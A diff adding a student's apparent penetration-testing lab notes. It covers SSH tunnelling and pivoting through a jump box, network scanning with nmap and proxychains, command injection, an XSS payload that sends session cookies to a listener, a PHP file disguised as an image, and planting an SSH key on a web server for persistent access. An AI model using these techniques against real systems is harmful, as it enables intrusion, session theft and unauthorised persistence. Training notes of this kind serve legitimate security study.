@@ -1,0 +1,57 @@
+                                  RECON
+================================================================================
+  1)  SSH to jump box
+    a.  ssh -MS /tmp/jmp student@<jumpip>
+  2)  Build socket
+    a.  ssh -S /tmp/jmp jmp -O Forward -D 9050
+    b.  [calles socket and makes it dynamic]
+  3)  Enumerate target network
+    a.  for i in {1..254}; do (ping -c 1 x.x.x.$i | grep "bytes from"&); done
+  4)  Host enumeration
+    a.  proxychains nmap -T5 <hostip>
+      i.  nmap -T5 --script=http-enum x.x.x.x
+  5)  Build on socket and include newly discovered hosts
+    a.  ssh -S /tmp/jmp jmp -O forward
+      -L 21001:x.x.x.x:21 -L 21002:x.x.x.x:22 -L 21003:x.x.x.x:80
+  6)  tear down proxychains
+    a.  ssh -S /tmp/jmp jmp -O cancel -D 9050
+  7)  create a new Master socket into T1
+    ssh -MS /tmp/T1 student@localhost -p 21002
+  8)  Repeat from step 3
+                                  Web Exp day 1
+================================================================================
+  HTTP CODES
+    10X  Informational
+    2XX  Success
+    30X  Redirection
+    4XX  Client Error
+    5XX  Server Error
+  HTTP Feilds
+    User-Agent, referrer, cookie, date, server, set-cookie
+  1)  XXS commands
+    a.  Command injection
+      ;  <bash>
+        ex: ; ls -lisa
+  2)  Cookie stealer - message boxes
+    a.  <script> document.location="http://<ip>:<listeningport>/?username=" + document.cookie;</script>
+    b.  Create a listener on linops
+  3)  Make script 
+    a.  vim image.pnp.php
+      [script]
+  4)  ssh keygen(LINOPS)
+    a.  ssh-keygen -t rsa -b 4096
+      >>enter, enter, and enter
+    b.  cat /.ssh/id_rsa.pub
+      (ON TARGET MACHINE)
+    c.  mkdir /var/www/.ssh
+      chmod 700 /var/www/.ssh
+    d.  touch /var/www/.ssh/authorized_keys
+      i.  creating file to add ssh-keygen to bypass authentications allowing ssh login ("key" copy straight from terminal)
+      ii.  echo("key") >> /var/www/.ssh/authroized_keysm
+  ssh www-data@localhost -p <port from step 5 local forward tunnel of methodolgy>
+    (Web server is temporary means to gain access via ssh)
+                                   Web Exp day 2 (sql injection)
+================================================================================ 
+  Get method
+  Post method
+
